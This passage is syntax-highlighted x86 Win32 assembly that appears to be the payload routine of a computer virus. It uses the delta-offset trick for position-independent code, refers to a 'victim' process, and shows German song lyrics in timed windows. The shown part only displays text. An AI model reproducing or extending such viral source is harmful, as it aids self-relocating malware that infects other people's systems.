                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">; finish?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_loop</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_TranslateMessage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; translate message</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_DispatchMessageA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; dispatch the message</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">msg_loop</span><span class="sc0">                               </span><span class="sc1">; do again</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">end_loop</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">@endsz</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">text_end</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">finish_process</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">process_end</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;did the victim finish?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">finish_process</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">new_window</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finish_process</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">process_end</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc5">WndProc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0">\                    </span><span class="sc1">; registers preserved</span><span class="sc0">
        </span><span class="sc5">hwnd</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lparam</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc1">; parameters</span><span class="sc0">
        </span><span class="sc9">LOCAL</span><span class="sc0">   </span><span class="sc5">theDC</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_PAINT</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wmpaint</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_DESTROY</span><span class="sc0">                     </span><span class="sc1">; destory window</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wmdestroy</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_CREATE</span><span class="sc0">                      </span><span class="sc1">; create window</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wmcreate</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_TIMER</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">defwndproc</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">defwndproc</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_DefWindowProcA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wmsg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">wparam</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lparam</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; define</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">finish</span><span class="sc0">                                </span><span class="sc1">; the window</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wmdestroy</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_ShowWindow</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">SW_HIDE</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_KillTimer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">htimer</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_PostQuitMessage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; kill the window</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">finish</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wmpaint</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_GetDC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">theDC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lppaint</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_BeginPaint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0">\ </span><span class="sc1">;</span><span class="sc0">
                         </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">]</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_TextOutA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">theDC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,\
</span><span class="sc0">                       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">current</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">textmetric.tmHeight</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_TextOutA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">theDC</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lppaint</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_EndPaint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">defwndproc</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wmcreate</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TimerProc</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_SetTimer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1111h</span><span class="sc4">,\
</span><span class="sc0">                       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">wintime</span><span class="sc4">],</span><span class="sc0">\   </span><span class="sc1">;</span><span class="sc0">
                       </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">htimer</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">defwndproc</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">finish</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WndProc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TimerProc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0">\                  </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc5">hwnd</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wmsg</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">timerid</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dwtime</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@@2</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">htimer</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">timerid</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exittime</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">_PostMessageA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">WM_DESTROY</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">exittime</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TimerProc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">text_start</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LA?</span><span class="sc0"> </span><span class="sc5">MICH</span><span class="sc0"> </span><span class="sc5">DEINE</span><span class="sc0"> </span><span class="sc5">TRANE</span><span class="sc0"> </span><span class="sc5">REITEN</span><span class="sc4">&gt;</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">UBERS</span><span class="sc0"> </span><span class="sc5">KINN</span><span class="sc0"> </span><span class="sc5">NACH</span><span class="sc0"> </span><span class="sc5">AFRIKA</span><span class="sc4">&gt;</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WIEDER</span><span class="sc0"> </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc5">DEN</span><span class="sc0"> </span><span class="sc5">SCHOSS</span><span class="sc0"> </span><span class="sc5">DER</span><span class="sc0"> </span><span class="sc5">LOWIN</span><span class="sc4">&gt;</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc5">ICH</span><span class="sc0"> </span><span class="sc5">EINST</span><span class="sc0"> </span><span class="sc5">ZUHAUSE</span><span class="sc0"> </span><span class="sc5">WAR</span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ZWISCHEN</span><span class="sc0"> </span><span class="sc5">DEINE</span><span class="sc0"> </span><span class="sc5">LANGEN</span><span class="sc0"> </span><span class="sc5">BEINEN</span><span class="sc4">&gt;</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SUCH</span><span class="sc0"> </span><span class="sc5">DEN</span><span class="sc0"> </span><span class="sc5">SCHNEE</span><span class="sc0"> </span><span class="sc5">VOM</span><span class="sc0"> </span><span class="sc5">LETZTEN</span><span class="sc0"> </span><span class="sc5">JAHR</span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DOCH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc5">IST</span><span class="sc0"> </span><span class="sc5">KEIN</span><span class="sc0"> </span><span class="sc5">SCHNEE</span><span class="sc0"> </span><span class="sc5">MEHR</span><span class="sc0"> </span><span class="sc5">DA</span><span class="sc4">&gt;</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">..</span><span class="sc4">&gt;</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LASS</span><span class="sc0"> </span><span class="sc5">MICH</span><span class="sc0"> </span><span class="sc5">DEINE</span><span class="sc0"> </span><span class="sc5">TRANE</span><span class="sc0"> </span><span class="sc5">REITEN</span><span class="sc4">&gt;</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">UBER</span><span class="sc0"> </span><span class="sc5">WOLKEN</span><span class="sc0"> </span><span class="sc5">OHNE</span><span class="sc0"> </span><span class="sc5">GLUCK</span><span class="sc4">&gt;</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DER</span><span class="sc0"> </span><span class="sc5">GROSSE</span><span class="sc0"> </span><span class="sc5">VOGEL</span><span class="sc0"> </span><span class="sc5">SCHIEBT</span><span class="sc0"> </span><span class="sc5">DEN</span><span class="sc0"> </span><span class="sc5">KOPF</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SANFT</span><span class="sc0"> </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc5">SEIN</span><span class="sc0"> </span><span class="sc5">VERSTECK</span><span class="sc0"> </span><span class="sc5">ZURUCK</span><span class="sc4">&gt;</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ZWISCHEN</span><span class="sc0"> </span><span class="sc5">DEINE</span><span class="sc0"> </span><span class="sc5">LANGEN</span><span class="sc0"> </span><span class="sc5">BEINEN</span><span class="sc4">&gt;</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SUCH</span><span class="sc0"> </span><span class="sc5">DEN</span><span class="sc0"> </span><span class="sc5">SAND</span><span class="sc0"> </span><span class="sc5">VOM</span><span class="sc0"> </span><span class="sc5">LETZTEN</span><span class="sc0"> </span><span class="sc5">JAHR</span><span class="sc4">&gt;</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DOCH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc5">IST</span><span class="sc0"> </span><span class="sc5">KEIN</span><span class="sc0"> </span><span class="sc5">SAND</span><span class="sc0"> </span><span class="sc5">MEHR</span><span class="sc0"> </span><span class="sc5">DA</span><span class="sc4">&gt;</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">..</span><span class="sc4">&gt;</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEHNSUCHT</span><span class="sc0"> </span><span class="sc5">VERSTECKT</span><span class="sc0">  </span><span class="sc4">&gt;</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
